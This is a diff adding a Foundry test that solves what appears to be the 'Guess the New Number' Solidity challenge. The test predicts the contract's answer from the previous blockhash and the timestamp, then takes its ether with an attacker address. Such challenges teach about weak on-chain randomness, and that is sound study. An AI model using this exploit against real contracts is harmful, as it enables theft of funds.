@@ -11,5 +11,17 @@ contract GuessNewNumTest is Test {
 
     function setUp() public {
         guessNewNum = new GuessTheNewNumberChallenge();
+        deal(h3x0r, 1 ether);
+        deal(address(guessNewNum), 1 ether);
+    }
+
+    function testNewNumExploit() public {
+        vm.startPrank(h3x0r);
+        // i have to fork this bc this is cheat
+        uint8 key = uint8(uint(keccak256(
+            abi.encodePacked(blockhash(block.number - 1), block.timestamp)
+        )));
+        guessNewNum.guess{value: 1 ether}(key);
+        assertEq(h3x0r.balance, 2 ether);
     }
 }
